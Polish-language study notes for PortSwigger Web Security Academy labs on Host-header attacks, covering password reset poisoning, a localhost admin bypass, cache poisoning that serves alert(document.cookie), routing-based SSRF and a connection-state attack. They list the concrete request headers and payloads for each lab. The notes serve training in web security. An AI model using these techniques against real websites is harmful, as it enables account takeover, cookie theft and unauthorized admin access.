Nagłówek Host informuje serwer, do jakiej domeny klient chce się dostać, a nie skąd pochodzi żądanie.

 

„użytkownik chce się dostać do domeny”

✅ to jest dokładnie rola Host


<br><br>
<hr>
<br><br>
<h2>Lab: Basic password reset poisoning</h2>

 Login
Funkcjonalnosc reset password: W exploit server > Email Client: Observer url temp-forgot-password-token > reset password
INTERPECT: forgot password for carlos > emploi server as a HOST header > access log
Weż token carlosa i wklej w swój url forgot password token

<br><br>
<hr>
<br><br>
<h2>Lab: Host header authentication bypass – HOST: LOCALHOST</h2>
Robots.txt

Admin > Admin interface only available to local users

Host: localhost


  <br><br>
<hr>
<br><br>
<h2>Lab: Web cache poisoning via ambiguous requests - alert(document.cookie) in the victim's browser. – PODWÓJNT HOST

Ambi - niejasny</h2>

X-Cache: HIT → odpowiedź była w cache i została z niego zwrócona

 X-Cache: MISS → brak w cache (pierwsze zapytanie, cache wygasł albo cache jest wyłączony)

 

Wybrać request z cookies

/cb=1

 

Explot server: /resources/js/tracking.js

Body: alert(document.cookie)

 

Jeśli dodamy drugi host, to on odbija się w tracking.js (podajemy tam exploit server)

  <br><br>
<hr>
<br><br>
<h2>Lab: Routing-based SSRF</h2>

1.Host: collaborator – informacyjnie

2.Host: 1192.168.0.§0§ + unchecked Update Host header to match target

3. status 302 > przekierowanie do admin

4. repeater host:IPz302 i robie request do /admin

5. otwieram w browser (delete carlos – not found)

6. biore znow ten host z IP i /delete/carlos

  <br><br>
<hr>
<br><br>
<h2>Lab: SSRF via flawed request parsing</h2>

GET https://YOUR-LAB-ID.web-security-academy.net/
Host: 192.168.0.§0§ + unchecked Update Host header to match target
status 302 > przekierowanie do admin i szukamy endpointu w odpowiedzi
change request method POST w body: csrf=wkqJIxnNqCpGU16YbmJuEG9AQSgZ7C1E&username=carlos|

<img width="1557" height="516" alt="image" src="https://github.com/user-attachments/assets/ac880af6-1ec1-48e5-9b95-8b3a92b0d7b6" />

<img width="1177" height="522" alt="image" src="https://github.com/user-attachments/assets/c3a64a17-15e8-4b54-b911-02581a70fe93" />

 <br><br>
<hr>
<br><br>
<h2>Lab: Host validation bypass via connection state attack</h2>

Lab pokazuje, jak obejść walidację nagłówka Host, wykorzystując stan połączenia (connection state) serwera HTTP – czyli fakt, że backend błędnie „zapamiętuje” nagłówek Host między kolejnymi requestami w tym samym połączeniu.

Gdzie jest błąd (sedno laba)
Serwer:

używa persistent connections (keep-alive),
prawidłowo waliduje Host tylko raz,
a potem ponownie używa tej samej wartości Host dla kolejnych requestów w tym samym połączeniu.
Innymi słowy:
backend nie resetuje stanu połączenia między żądaniami.

Atak: „connection state attack”

Krok 1 – „zatrucie” stanu połączenia
Wysyłasz request:

GET / HTTP/1.1
Host: victim.com
Connection: keep-alive
✅ Host jest poprawny → połączenie zostaje zaakceptowane
✅ backend zapamiętuje Host: victim.com jako stan połączenia

 

Krok 2 – request z nieprawidłowym Host

W tym samym połączeniu TCP wysyłasz kolejny request:

GET /admin HTTP/1.1
Host: attacker.com

Co się dzieje:

frontend / proxy widzi Host: attacker.com,
ale backend nadal używa zapamiętanego victim.com,
walidacja zostaje logicznie ominięta.
👉 Request jest obsłużony tak, jakby Host był poprawny.

<img width="1272" height="557" alt="image" src="https://github.com/user-attachments/assets/31ceb394-deaf-4718-aa3a-1a549c9ca153" />

<img width="1272" height="590" alt="image" src="https://github.com/user-attachments/assets/2a9149d1-8ec0-4759-be54-12023fb96cf5" />

change request method POST w body: csrf=wkqJIxnNqCpGU16YbmJuEG9AQSgZ7C1E&username=carlos|
